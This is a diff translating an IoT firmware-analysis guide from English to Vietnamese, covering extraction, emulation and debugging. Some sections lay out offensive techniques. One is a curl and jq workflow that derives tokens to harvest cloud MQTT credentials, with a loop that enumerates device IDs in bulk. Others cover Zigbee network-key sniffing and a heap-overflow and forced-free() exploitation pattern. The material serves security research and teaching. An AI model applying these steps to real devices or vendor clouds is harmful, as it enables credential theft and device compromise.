-### Initial Analysis Tools
+### Công cụ phân tích ban đầu
 
-A set of commands is provided for initial inspection of the binary file (referred to as `<bin>`). These commands help in identifying file types, extracting strings, analyzing binary data, and understanding the partition and filesystem details:
+Một tập hợp lệnh được cung cấp để kiểm tra sơ bộ tệp nhị phân (được gọi là `<bin>`). Các lệnh này giúp xác định loại tệp, trích xuất chuỗi, phân tích dữ liệu nhị phân và tìm hiểu chi tiết về phân vùng cũng như hệ thống tệp:
 
 ```bash
 file <bin>
@@ -288,13 +287,13 @@ hexdump -C <bin> | head #useful for finding signatures in the header
 fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
 ```
 
-To assess the encryption status of the image, the **entropy** is checked with `binwalk -E <bin>`. Low entropy suggests a lack of encryption, while high entropy indicates possible encryption or compression.
+Để đánh giá trạng thái mã hóa của image, hãy kiểm tra **entropy** bằng `binwalk -E <bin>`. Entropy thấp cho thấy có thể không có mã hóa, còn entropy cao cho thấy có thể có mã hóa hoặc nén.
 
-For extracting **embedded files**, tools and resources like the **file-data-carving-recovery-tools** documentation and **binvis.io** for file inspection are recommended.
+Để trích xuất **các tệp nhúng**, nên dùng những công cụ và tài nguyên như tài liệu **file-data-carving-recovery-tools** và **binvis.io** để kiểm tra tệp.
 
-### Extracting the Filesystem
+### Trích xuất hệ thống tệp
 
-Using `binwalk -ev <bin>`, one can usually extract the filesystem, often into a directory named after the filesystem type (e.g., squashfs, ubifs). However, when **binwalk** fails to recognize the filesystem type due to missing magic bytes, manual extraction is necessary. This involves using `binwalk` to locate the filesystem's offset, followed by the `dd` command to carve out the filesystem:
+Dùng `binwalk -ev <bin>`, thường có thể trích xuất hệ thống tệp vào một thư mục mang tên loại hệ thống tệp đó (ví dụ: squashfs, ubifs). Tuy nhiên, khi **binwalk** không nhận diện được loại hệ thống tệp do thiếu magic bytes, cần trích xuất thủ công. Cách này gồm việc dùng `binwalk` để xác định offset của hệ thống tệp, sau đó dùng lệnh `dd` để tách hệ thống tệp ra:
 
 ```bash
 $ binwalk DIR850L_REVB.bin
@@ -302,64 +301,64 @@ $ binwalk DIR850L_REVB.bin
 $ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
 ```
 
-Afterwards, depending on the filesystem type (e.g., squashfs, cpio, jffs2, ubifs), different commands are used to manually extract the contents.
+Sau đó, tùy thuộc vào loại hệ thống tệp (ví dụ: squashfs, cpio, jffs2, ubifs), sẽ dùng các lệnh khác nhau để trích xuất thủ công nội dung.
 
-### Filesystem Analysis
+### Phân tích hệ thống tệp
 
-With the filesystem extracted, the search for security flaws begins. Attention is paid to insecure network daemons, hardcoded credentials, API endpoints, update server functionalities, uncompiled code, startup scripts, and compiled binaries for offline analysis.
+Sau khi trích xuất hệ thống tệp, quá trình tìm kiếm lỗ hổng bảo mật bắt đầu. Cần chú ý đến các network daemon không an toàn, thông tin xác thực được hardcode, API endpoint, chức năng của máy chủ cập nhật, mã nguồn chưa biên dịch, script khởi động và các binary đã biên dịch để phân tích offline.
 
-**Key locations** and **items** to inspect include:
+**Các vị trí** và **mục quan trọng** cần kiểm tra bao gồm:
 
-- **etc/shadow** and **etc/passwd** for user credentials
-- SSL certificates and keys in **etc/ssl**
-- Configuration and script files for potential vulnerabilities
-- Embedded binaries for further analysis
-- Common IoT device web servers and binaries
+- **etc/shadow** và **etc/passwd** để tìm thông tin xác thực người dùng
+- Chứng chỉ và khóa SSL trong **etc/ssl**
+- Các tệp cấu hình và script có thể chứa lỗ hổng
+- Các binary nhúng để phân tích thêm
+- Các web server và binary phổ biến trên thiết bị IoT
 
-Several tools assist in uncovering sensitive information and vulnerabilities within the filesystem:
+Một số công cụ hỗ trợ phát hiện thông tin nhạy cảm và lỗ hổng trong hệ thống tệp:
 
-- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) and [**Firmwalker**](https://github.com/craigz28/firmwalker) for sensitive information search
-- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) for comprehensive firmware analysis
-- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), and [**EMBA**](https://github.com/e-m-b-a/emba) for static and dynamic analysis
+- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) và [**Firmwalker**](https://github.com/craigz28/firmwalker) để tìm kiếm thông tin nhạy cảm
+- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) để phân tích firmware toàn diện
+- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) và [**EMBA**](https://github.com/e-m-b-a/emba) để phân tích tĩnh và động
 
-### Security Checks on Compiled Binaries
+### Kiểm tra bảo mật trên các binary đã biên dịch
 
-Both source code and compiled binaries found in the filesystem must be scrutinized for vulnerabilities. Tools like **checksec.sh** for Unix binaries and **PESecurity** for Windows binaries help identify unprotected binaries that could be exploited.
+Cần kiểm tra kỹ cả mã nguồn lẫn các binary đã biên dịch có trong hệ thống tệp để tìm lỗ hổng. Các công cụ như **checksec.sh** cho binary Unix và **PESecurity** cho binary Windows giúp xác định những binary không được bảo vệ và có thể bị khai thác.
 
-## Harvesting cloud config and MQTT credentials via derived URL tokens
+## Thu thập cấu hình cloud và thông tin xác thực MQTT thông qua token URL được suy ra
 
-Many IoT hubs fetch their per-device configuration from a cloud endpoint that looks like:<sup>[[5]](#references)</sup>
+Nhiều hub IoT lấy cấu hình riêng cho từng thiết bị từ một cloud endpoint có dạng:<sup>[[5]](#references)</sup>
 
 - `https://<api-host>/pf/<deviceId>/<token>`
 
-During firmware analysis you may find that `<token>` is derived locally from the device ID using a hardcoded secret, for example:
+Trong quá trình phân tích firmware, bạn có thể phát hiện `<token>` được suy ra cục bộ từ device ID bằng một secret được hardcode, ví dụ:
 
-- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex
+- token = MD5( deviceId || STATIC_KEY ) và được biểu diễn dưới dạng hex viết hoa
 
-This design enables anyone who learns a deviceId and the STATIC_KEY to reconstruct the URL and pull cloud config, often revealing plaintext MQTT credentials and topic prefixes.
+Thiết kế này cho phép bất kỳ ai biết deviceId và STATIC_KEY đều có thể tạo lại URL và truy xuất cấu hình cloud, thường làm lộ thông tin xác thực MQTT dạng văn bản thuần và tiền tố topic.
 
-Practical workflow:
+Quy trình thực tế:
 
-1) Extract deviceId from UART boot logs
+1) Trích xuất deviceId từ log khởi động UART
 
-- Connect a 3.3V UART adapter (TX/RX/GND) and capture logs:
+- Kết nối bộ chuyển đổi UART 3.3V (TX/RX/GND) và ghi lại log:
 
 ```bash
 picocom -b 115200 /dev/ttyUSB0
 ```
 
-- Look for lines printing the cloud config URL pattern and broker address, for example:
+- Tìm các dòng in mẫu URL cấu hình cloud và địa chỉ broker, ví dụ:
 
 ```
 Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
 MQTT: mqtt://mq-gw.vendor.tld:8001
 ```
 
-2) Recover STATIC_KEY and token algorithm from firmware
+2) Khôi phục STATIC_KEY và thuật toán token từ firmware
 
-- Load binaries into Ghidra/radare2 and search for the config path ("/pf/") or MD5 usage.
-- Confirm the algorithm (e.g., MD5(deviceId||STATIC_KEY)).
-- Derive the token in Bash and uppercase the digest:
+- Nạp binary vào Ghidra/radare2 và tìm đường dẫn cấu hình ("/pf/") hoặc cách sử dụng MD5.
+- Xác nhận thuật toán (ví dụ: MD5(deviceId||STATIC_KEY)).
+- Tạo token bằng Bash và chuyển mã băm thành chữ hoa:
 
 ```bash
 DEVICE_ID="d88b00112233"
@@ -367,9 +366,9 @@ STATIC_KEY="cf50deadbeefcafebabe"
 printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
 ```
 
-3) Harvest cloud config and MQTT credentials
+3) Thu thập cấu hình cloud và thông tin xác thực MQTT
 
-- Compose the URL and pull JSON with curl; parse with jq to extract secrets:
+- Tạo URL và tải JSON bằng curl; phân tích bằng jq để trích xuất bí mật:
 
 ```bash
 API_HOST="https://api.vendor.tld"
@@ -378,9 +377,9 @@ curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
 # Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
 ```
 
-4) Abuse plaintext MQTT and weak topic ACLs (if present)
+4) Lạm dụng MQTT dạng plaintext và ACL topic yếu (nếu có)
 
-- Use recovered credentials to subscribe to maintenance topics and look for sensitive events:
+- Dùng thông tin xác thực đã khôi phục để subscribe các topic bảo trì và tìm các sự kiện nhạy cảm:
 
 ```bash
 mosquitto_sub -h <broker> -p <port> -V mqttv311 \
@@ -388,10 +387,10 @@ mosquitto_sub -h <broker> -p <port> -V mqttv311 \
   -t "<topic_prefix>/<deviceId>/admin" -v
 ```
 
-5) Enumerate predictable device IDs (at scale, with authorization)
+5) Liệt kê các device ID có thể dự đoán được (ở quy mô lớn, khi được cấp phép)
 
-- Many ecosystems embed vendor OUI/product/type bytes followed by a sequential suffix.
-- You can iterate candidate IDs, derive tokens and fetch configs programmatically:
+- Nhiều hệ sinh thái nhúng các byte OUI/sản phẩm/loại của vendor, sau đó là một hậu tố tuần tự.
+- Bạn có thể lần lượt thử các ID ứng viên, tạo token và tải cấu hình bằng chương trình:
 
 ```bash
 API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
@@ -402,61 +401,60 @@ for SUF in $(seq -w 000000 0000FF); do
 done
 ```
 
-Notes
-- Always obtain explicit authorization before attempting mass enumeration.
-- Prefer emulation or static analysis to recover secrets without modifying target hardware when possible.
+Ghi chú
+- Luôn xin phép rõ ràng trước khi thử thực hiện việc liệt kê hàng loạt.
+- Khi có thể, hãy ưu tiên mô phỏng hoặc phân tích tĩnh để khôi phục bí mật mà không sửa đổi phần cứng mục tiêu.
 
+Quá trình mô phỏng firmware cho phép thực hiện **phân tích động** hoạt động của thiết bị hoặc của một chương trình riêng lẻ. Cách tiếp cận này có thể gặp khó khăn do phụ thuộc vào phần cứng hoặc kiến trúc, nhưng việc chuyển root filesystem hoặc các binary cụ thể sang một thiết bị có kiến trúc và endianness tương ứng, chẳng hạn như Raspberry Pi, hoặc sang một máy ảo dựng sẵn, có thể hỗ trợ kiểm thử thêm.
 
-The process of emulating firmware enables **dynamic analysis** either of a device's operation or an individual program. This approach can encounter challenges with hardware or architecture dependencies, but transferring the root filesystem or specific binaries to a device with matching architecture and endianness, such as a Raspberry Pi, or to a pre-built virtual machine, can facilitate further testing.
+### Mô phỏng các Binary riêng lẻ
 
-### Emulating Individual Binaries
+Khi kiểm tra một chương trình riêng lẻ, việc xác định endianness và kiến trúc CPU của chương trình là rất quan trọng.
 
-For examining single programs, identifying the program's endianness and CPU architecture is crucial.
+#### Ví dụ với kiến trúc MIPS
 
-#### Example with MIPS Architecture
-
-To emulate a MIPS architecture binary, one can use the command:
+Để mô phỏng một binary có kiến trúc MIPS, có thể dùng lệnh:
 
 ```bash
 file ./squashfs-root/bin/busybox
 ```
 
-And to install the necessary emulation tools:
+Và để cài đặt các công cụ mô phỏng cần thiết:
 
 ```bash
 sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
 ```
 
-For MIPS (big-endian), `qemu-mips` is used, and for little-endian binaries, `qemu-mipsel` would be the choice.
+Đối với MIPS (big-endian), dùng `qemu-mips`; còn với các binary little-endian, có thể dùng `qemu-mipsel`.
 
-#### ARM Architecture Emulation
+#### Mô phỏng kiến trúc ARM
 
-For ARM binaries, the process is similar, with the `qemu-arm` emulator being utilized for emulation.
+Đối với các binary ARM, quy trình tương tự, sử dụng emulator `qemu-arm` để mô phỏng.
 
-### Full System Emulation
+### Mô phỏng toàn bộ hệ thống
 
-Tools like [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), and others, facilitate full firmware emulation, automating the process and aiding in dynamic analysis.
+Các công cụ như [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) và các công cụ khác hỗ trợ mô phỏng firmware toàn bộ, tự động hóa quy trình và hỗ trợ dynamic analysis.
 
-### Reconstructing split and verified root filesystems for emulation
+### Tái dựng root filesystem bị chia tách và xác minh để mô phỏng
 
-If a SquashFS superblock is readable but inode, directory, or fragment-table offsets are impossible, do not immediately patch `unsquashfs`. Reverse the early boot binary and reproduce the block-device graph it creates: embedded systems may expose a nominal root partition but construct the real filesystem with a `dm-linear` mapping that appends sectors borrowed from another partition. Superblock-only checks can succeed even when every later metadata block is displaced.<sup>[[11]](#references)</sup>
+Nếu superblock của SquashFS có thể đọc được nhưng các offset của inode, thư mục hoặc fragment table không hợp lý, đừng vội vá `unsquashfs`. Hãy reverse binary khởi động sớm và tái tạo đồ thị block device mà binary này tạo ra: các hệ thống nhúng có thể cung cấp một phân vùng root danh nghĩa nhưng lại dựng filesystem thực bằng ánh xạ `dm-linear`, nối thêm các sector mượn từ một phân vùng khác. Các phép kiểm tra chỉ dựa vào superblock có thể thành công dù mọi block metadata phía sau đều bị lệch.<sup>[[11]](#references)</sup>
 
-Preserve the firmware's arithmetic exactly. In particular, identify whether lengths are bytes, 512-byte sectors, or 4 KiB pages; reproduce shifts and truncation in their original order; and account for bank-dependent tail regions in A/B layouts. For example, `(partition_bytes >> 12) << 3` first truncates to a 4 KiB boundary and only then expresses the result in 512-byte sectors; replacing it with `partition_bytes // 512` can move the appended extent by a few kilobytes and corrupt all downstream SquashFS tables.<sup>[[11]](#references)</sup>
+Hãy giữ nguyên chính xác các phép tính của firmware. Cụ thể, xác định độ dài được tính theo byte, sector 512 byte hay page 4 KiB; tái tạo các phép dịch bit và cắt cụt theo đúng thứ tự ban đầu; đồng thời tính đến các vùng đuôi phụ thuộc vào bank trong bố cục A/B. Ví dụ, `(partition_bytes >> 12) << 3` trước tiên cắt cụt đến ranh giới 4 KiB rồi mới biểu diễn kết quả theo sector 512 byte; thay bằng `partition_bytes // 512` có thể làm dịch extent nối thêm vài kilobyte và làm hỏng mọi bảng SquashFS phía sau.<sup>[[11]](#references)</sup>
 
-A useful validation workflow is:<sup>[[11]](#references)</sup>
+Quy trình xác thực hữu ích:<sup>[[11]](#references)</sup>
 
-1. Recover each `dm-linear` segment's source device, start sector, and length from the verifier/init binary.
-2. Concatenate or map the extents without changing their alignment semantics.
-3. If extraction still fails, search only a small window around the predicted boundary and require several consecutive valid metadata structures, rather than accepting a plausible superblock alone.
-4. Run an unmodified `unsquashfs` against the reconstructed image; successful traversal of all directories and fragments is stronger evidence than `unsquashfs -stat`.
+1. Từ binary verifier/init, xác định device nguồn, sector bắt đầu và độ dài của từng segment `dm-linear`.
+2. Nối hoặc ánh xạ các extent mà không làm thay đổi ngữ nghĩa căn chỉnh của chúng.
+3. Nếu vẫn không trích xuất được, chỉ tìm trong một vùng nhỏ quanh ranh giới dự đoán và yêu cầu nhiều cấu trúc metadata hợp lệ liên tiếp, thay vì chỉ chấp nhận một superblock trông có vẻ hợp lệ.
+4. Chạy `unsquashfs` chưa chỉnh sửa trên image đã tái dựng; duyệt thành công mọi thư mục và fragment là bằng chứng đáng tin cậy hơn `unsquashfs -stat`.
 
-#### Analyst-controlled dm-verity replacement
+#### Thay thế dm-verity do analyst kiểm soát
 
-When the analyst controls the QEMU kernel, initramfs, and virtual disks, a modified root can be booted by replacing the vendor's verification PID 1 with a small statically linked init. This is a **lab boot-chain substitution**, not a break of dm-verity, its RSA signature, Secure Boot, or a TPM-sealed key.<sup>[[11]](#references)</sup>
+Khi analyst kiểm soát QEMU kernel, initramfs và virtual disk, có thể khởi động một root đã chỉnh sửa bằng cách thay PID 1 xác minh của vendor bằng một init nhỏ được liên kết tĩnh. Đây là **thay thế chuỗi khởi động trong lab**, không phải phá dm-verity, chữ ký RSA, Secure Boot hay khóa được TPM niêm phong.<sup>[[11]](#references)</sup>
 
-The replacement init should mirror the operational parts of the original boot path: mount `devtmpfs`, call `setsid()`, connect `/dev/console` to file descriptors 0–2, mount `/proc` and `/sys`, wait for the supplied block device, mount the edited root read-only, detach the old-root pseudo-filesystems, move the new mount onto `/`, `chroot`, and `execve()` the firmware's original `/sbin/init`. Detaching `/dev`, `/proc`, and `/sys` **before** `MS_MOVE` avoids accidentally detaching mount points belonging to the new root.<sup>[[11]](#references)</sup>
+Init thay thế nên mô phỏng các phần vận hành của quy trình khởi động ban đầu: mount `devtmpfs`, gọi `setsid()`, kết nối `/dev/console` với các file descriptor 0–2, mount `/proc` và `/sys`, chờ block device được cung cấp, mount root đã chỉnh sửa ở chế độ chỉ đọc, detach các pseudo-filesystem của old-root, chuyển mount mới sang `/` bằng `MS_MOVE`, gọi `chroot` rồi `execve()` `/sbin/init` gốc của firmware. Detach `/dev`, `/proc` và `/sys` **trước** `MS_MOVE` để tránh vô tình detach các mount point thuộc root mới.<sup>[[11]](#references)</sup>
 
-Keep mutable device state separate from the modified immutable root. A qcow2 overlay can preserve the original disk's LVM state while a second read-only virtio disk supplies the edited SquashFS:<sup>[[11]](#references)</sup>
+Hãy giữ trạng thái thiết bị có thể thay đổi tách biệt khỏi root bất biến đã chỉnh sửa. Một qcow2 overlay có thể giữ lại trạng thái LVM của disk gốc, trong khi một virtio disk thứ hai ở chế độ chỉ đọc cung cấp SquashFS đã chỉnh sửa:<sup>[[11]](#references)</sup>
 
 ```bash
 qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
@@ -466,9 +464,9 @@ qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
   -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
 ```
 
-#### Offline image-state debugging
+#### Gỡ lỗi trạng thái image ngoại tuyến
 
-Inspect persistent state outside the guest when slow boots, destructive startup scripts, or unreliable console logging obscure the failure. Never attach an overlay that a running VM is using; expose it with `qemu-nbd`, constrain LVM discovery to the intended NBD partition, and deactivate the volume group before disconnecting it.<sup>[[11]](#references)</sup>
+Kiểm tra trạng thái lưu trữ bên ngoài guest khi quá trình khởi động chậm, script khởi động có tính phá hoại hoặc log console không đáng tin cậy khiến khó xác định lỗi. Không bao giờ gắn overlay mà một VM đang chạy sử dụng; hiển thị nó bằng `qemu-nbd`, giới hạn việc dò tìm LVM vào phân vùng NBD dự kiến và vô hiệu hóa volume group trước khi ngắt kết nối.<sup>[[11]](#references)</sup>
 
 ```bash
 sudo modprobe nbd max_part=16
@@ -479,17 +477,17 @@ sudo vgchange -an VG_NAME
 sudo qemu-nbd --disconnect /dev/nbd0
 ```
 
-For repeatable fault isolation, write timestamped marker files to a stable writable volume and verify them offline; `/dev/kmsg`, FIFOs, and transient consoles can produce false negatives through rate limiting or early process death. Also compare exact interfaces across layers before changing unrelated code: `uname -r` versus `/lib/modules/`, on-disk ext4 features versus kernel configuration, and the Mesa `libGL` generation versus DRI driver ABI and PCI-derived driver names. A component can exist and even `dlopen()` successfully while remaining unusable because its consumer expects a different ABI.<sup>[[11]](#references)</sup>
+Để cô lập lỗi có thể lặp lại, hãy ghi các tệp đánh dấu có dấu thời gian vào một volume ổn định có quyền ghi và xác minh chúng khi ngoại tuyến; `/dev/kmsg`, FIFO và console tạm thời có thể gây kết quả âm tính giả do giới hạn tốc độ hoặc tiến trình chết sớm. Ngoài ra, hãy so sánh chính xác các giao diện giữa các lớp trước khi thay đổi mã không liên quan: `uname -r` với `/lib/modules/`, các tính năng ext4 trên đĩa với cấu hình kernel, và thế hệ Mesa `libGL` với ABI của DRI driver cũng như tên driver suy ra từ PCI. Một thành phần có thể tồn tại và thậm chí `dlopen()` thành công nhưng vẫn không sử dụng được vì thành phần tiêu thụ nó mong đợi một ABI khác.<sup>[[11]](#references)</sup>
 
-## Dynamic Analysis in Practice
+## Phân tích động trong thực tế
 
-At this stage, either a real or emulated device environment is used for analysis. It's essential to maintain shell access to the OS and filesystem. Emulation may not perfectly mimic hardware interactions, necessitating occasional emulation restarts. Analysis should revisit the filesystem, exploit exposed webpages and network services, and explore bootloader vulnerabilities. Firmware integrity tests are critical to identify potential backdoor vulnerabilities.
+Ở giai đoạn này, môi trường thiết bị thực hoặc giả lập được dùng để phân tích. Điều thiết yếu là duy trì quyền truy cập shell vào OS và filesystem. Giả lập có thể không mô phỏng chính xác các tương tác với phần cứng, khiến đôi khi cần khởi động lại trình giả lập. Quá trình phân tích cần xem xét lại filesystem, khai thác các trang web và dịch vụ mạng bị lộ, đồng thời khám phá các lỗ hổng bootloader. Kiểm tra tính toàn vẹn firmware rất quan trọng để xác định các lỗ hổng backdoor tiềm ẩn.
 
-## Runtime Analysis Techniques
+## Các kỹ thuật phân tích thời gian chạy
 
-Runtime analysis involves interacting with a process or binary in its operating environment, using tools like gdb-multiarch, Frida, and Ghidra for setting breakpoints and identifying vulnerabilities through fuzzing and other techniques.
+Phân tích thời gian chạy bao gồm tương tác với một tiến trình hoặc binary trong môi trường hoạt động của nó, sử dụng các công cụ như gdb-multiarch, Frida và Ghidra để đặt breakpoint và xác định lỗ hổng thông qua fuzzing cùng các kỹ thuật khác.
 
-For embedded targets without a full debugger, **copy a statically-linked `gdbserver`** to the device and attach remotely:<sup>[[6]](#references)</sup>
+Đối với các mục tiêu nhúng không có debugger đầy đủ, hãy **sao chép một `gdbserver` được liên kết tĩnh** vào thiết bị rồi kết nối từ xa:<sup>[[6]](#references)</sup>
 
 ```bash
 # On device
@@ -502,101 +500,101 @@ gdb-multiarch /path/to/targetd
 target remote <device-ip>:1234
 ```
 
-### Zigbee / radio-co-processor message mapping
+### Ánh xạ thông điệp Zigbee / radio co-processor
 
-On IoT hubs the RF stack is often split between a **radio MCU** and a Linux userland process. A useful workflow is to map the path:<sup>[[8]](#references)</sup>
+Trên các hub IoT, ngăn xếp RF thường được chia giữa **radio MCU** và một tiến trình userland Linux. Một quy trình hữu ích là ánh xạ đường đi:<sup>[[8]](#references)</sup>
 
-1. **RF frame** on the air
-2. **controller-side parser** on the radio MCU
-3. **serial/UART text or TLV protocol** forwarded to Linux (for example `/dev/tty*`)
-4. **application dispatcher** in the main daemon
+1. **RF frame** truyền qua sóng
+2. **controller-side parser** trên radio MCU
+3. **serial/UART text hoặc giao thức TLV** được chuyển tiếp đến Linux (ví dụ `/dev/tty*`)
+4. **application dispatcher** trong daemon chính
 5. **protocol-specific handler / state machine**
 
-This architecture creates two reversing targets instead of one. If the controller converts binary radio frames into a textual protocol such as `Group,Command,arg1,arg2,...`, recover:
+Kiến trúc này tạo ra hai mục tiêu reverse engineering thay vì một. Nếu controller chuyển các RF frame nhị phân thành một giao thức dạng văn bản như `Group,Command,arg1,arg2,...`, hãy tìm ra:
 
-- The **message groups** and dispatch tables
-- Which messages can come from the **network** versus the controller itself
-- The exact **manufacturer-specific discriminator fields** (for example Zigbee `manufacturer_code` and custom `cluster_command`)
-- Which handlers are only reachable during **commissioning**, discovery, or firmware/model download phases
+- Các **message group** và bảng dispatch
+- Những thông điệp nào có thể đến từ **network** so với chính controller
+- Các trường phân biệt chính xác dành riêng cho **manufacturer** (ví dụ Zigbee `manufacturer_code` và `cluster_command` tùy chỉnh)
+- Những handler chỉ có thể được gọi trong các giai đoạn **commissioning**, discovery hoặc tải firmware/model
 
-For Zigbee specifically, capture pairing traffic and check whether the target still relies on the default **Link Key** `ZigBeeAlliance09`. If so, sniffing commissioning traffic may expose the **Network Key**. Zigbee 3.0 install codes reduce this exposure, so note whether the tested device actually enforces them.
+Riêng với Zigbee, hãy capture lưu lượng pairing và kiểm tra xem thiết bị mục tiêu còn dựa vào **Link Key** mặc định `ZigBeeAlliance09` hay không. Nếu có, sniff lưu lượng commissioning có thể làm lộ **Network Key**. Install code của Zigbee 3.0 giúp giảm nguy cơ này, vì vậy hãy ghi nhận liệu thiết bị được kiểm thử có thực sự bắt buộc sử dụng chúng hay không.
 
-### Manufacturer-specific protocol handlers and FSM-gated reachability
+### Handler giao thức dành riêng cho manufacturer và khả năng tiếp cận bị FSM chi phối
 
-Vendor-specific Zigbee/ZCL commands are often a better target than standardized clusters because they feed **custom parsing code** and internal **FSMs** with less battle-tested validation.<sup>[[8]](#references)</sup>
+Các lệnh Zigbee/ZCL riêng của vendor thường là mục tiêu tốt hơn các cluster tiêu chuẩn, vì chúng đi vào **custom parsing code** và các **FSM** nội bộ với cơ chế kiểm tra ít được kiểm chứng hơn.<sup>[[8]](#references)</sup>
 
-Practical workflow:
+Quy trình thực tế:
 
-- Reverse the command dispatcher until you find the **vendor-only handler**.
-- Recover the **FSM state**, **event**, **check**, **action**, and **next-state** tables.
-- Identify **transitional states** that auto-advance and retry/error branches that eventually reset or free attacker-controlled state.
-- Confirm which legitimate protocol exchanges are required to place the daemon in the vulnerable state instead of assuming the buggy handler is always reachable.
+- Reverse command dispatcher cho đến khi tìm thấy **vendor-only handler**.
+- Khôi phục các bảng **FSM state**, **event**, **check**, **action** và **next-state**.
+- Xác định các **transitional state** tự động chuyển tiếp, cùng các nhánh retry/error cuối cùng sẽ reset hoặc giải phóng state do attacker kiểm soát.
+- Xác nhận những trao đổi giao thức hợp lệ nào cần có để đưa daemon vào state dễ bị tấn công, thay vì mặc định rằng buggy handler luôn có thể được gọi.
 
-For timing-sensitive protocols, packet replay from a Python framework may be too slow. A more reliable approach is to emulate a legitimate device on real hardware (for example an **nRF52840**) with a vendor-grade stack so you can expose the correct **endpoints**, **attributes**, and commissioning timing.
+Với các giao thức nhạy về thời gian, replay packet từ một Python framework có thể quá chậm. Cách đáng tin cậy hơn là mô phỏng một thiết bị hợp lệ trên phần cứng thật (ví dụ **nRF52840**) bằng stack cấp vendor để có thể làm lộ đúng các **endpoint**, **attribute** và thời điểm commissioning.
 
-### Fragmented-download bug class in embedded daemons
+### Lớp lỗi tải xuống phân mảnh trong embedded daemon
 
-A recurring firmware bug class appears in **fragmented blob/model/configuration downloads**:<sup>[[8]](#references)</sup>
+Một lớp lỗi firmware thường gặp xuất hiện trong các quá trình tải xuống blob/model/configuration bị **phân mảnh**:<sup>[[8]](#references)</sup>
 
-1. The **first fragment** (`offset == 0`) stores `ctx->total_size` and allocates `malloc(total_size)`.
-2. Later fragments only validate the attacker-controlled **packet-local** fields such as `packet_total_size >= offset + chunk_len`.
-3. The copy uses `memcpy(&ctx->buffer[offset], chunk, chunk_len)` without checking against the **original allocated size**.
+1. **Fragment đầu tiên** (`offset == 0`) lưu `ctx->total_size` và cấp phát `malloc(total_size)`.
+2. Các fragment sau chỉ kiểm tra các trường **cục bộ trong packet** do attacker kiểm soát, chẳng hạn `packet_total_size >= offset + chunk_len`.
+3. Lệnh copy dùng `memcpy(&ctx->buffer[offset], chunk, chunk_len)` mà không kiểm tra giới hạn so với **kích thước đã cấp phát ban đầu**.
 
-This lets an attacker send:
+Điều này cho phép attacker gửi:
 
-- A first valid fragment with a **small** declared total size to force a small heap allocation.
-- A later fragment with the **expected offset** but a larger `chunk_len`.
-- A forged packet-local size that satisfies the fresh checks while still overflowing the originally allocated buffer.
+- Một fragment hợp lệ đầu tiên khai báo **total size nhỏ** để buộc cấp phát heap nhỏ.
+- Một fragment sau đó có **offset dự kiến** nhưng `chunk_len` lớn hơn.
+- Một packet-local size giả mạo vượt qua các bước kiểm tra mới, nhưng vẫn làm tràn buffer đã cấp phát ban đầu.
 
-When the vulnerable path sits behind commissioning logic, exploitation must include enough **device emulation** to drive the target into the expected model-download or blob-download state before sending the malformed fragments.
+Khi đường thực thi dễ bị tấn công nằm sau logic commissioning, việc khai thác phải bao gồm đủ **device emulation** để đưa mục tiêu vào đúng state tải model hoặc blob trước khi gửi các fragment sai định dạng.
 
-### Protocol-driven `free()` triggers
+### Kích hoạt `free()` thông qua giao thức
 
-In embedded daemons, the easiest way to trigger heap metadata exploitation is often not "wait for cleanup" but **force the protocol's own error handling**:<sup>[[8]](#references)</sup>
+Trong embedded daemon, cách dễ nhất để kích hoạt khai thác heap metadata thường không phải là “chờ cleanup”, mà là **buộc cơ chế xử lý lỗi của chính giao thức hoạt động**:<sup>[[8]](#references)</sup>
 
-- Send malformed follow-up fragments to push the FSM into **retry** or **error** states.
-- Exceed the retry threshold so the daemon **resets context** and frees the corrupted buffer.
-- Use this predictable `free()` to trigger allocator-side primitives before the process crashes for unrelated reasons.
+- Gửi các fragment tiếp theo sai định dạng để đẩy FSM vào state **retry** hoặc **error**.
+- Vượt ngưỡng retry để daemon **reset context** và giải phóng buffer đã bị làm hỏng.
+- Tận dụng lần `free()` có thể dự đoán này để kích hoạt các primitive phía allocator trước khi tiến trình crash vì nguyên nhân không liên quan.
 
-This is especially useful against **musl/uClibc/dlmalloc-like** allocators in embedded Linux, where corrupting chunk metadata can turn unlink/unbin logic into a write primitive. A stable pattern is to corrupt a **size field** to redirect allocator traversal into **fake chunks staged inside the overflowed buffer**, instead of immediately clobbering real bin pointers and crashing the process.
+Cách này đặc biệt hữu ích với các allocator kiểu **musl/uClibc/dlmalloc** trên embedded Linux, nơi việc làm hỏng chunk metadata có thể biến logic unlink/unbin thành primitive ghi. Một cách ổn định là làm hỏng **size field** để chuyển hướng quá trình duyệt của allocator vào các **fake chunk được bố trí bên trong buffer đã bị overflow**, thay vì lập tức ghi đè bin pointer thật và làm tiến trình crash.
 
-## Binary Exploitation and Proof-of-Concept
+## Khai thác nhị phân và Proof-of-Concept
 
-Developing a PoC for identified vulnerabilities requires a deep understanding of the target architecture and programming in lower-level languages. Binary runtime protections in embedded systems are rare, but when present, techniques like Return Oriented Programming (ROP) may be necessary.
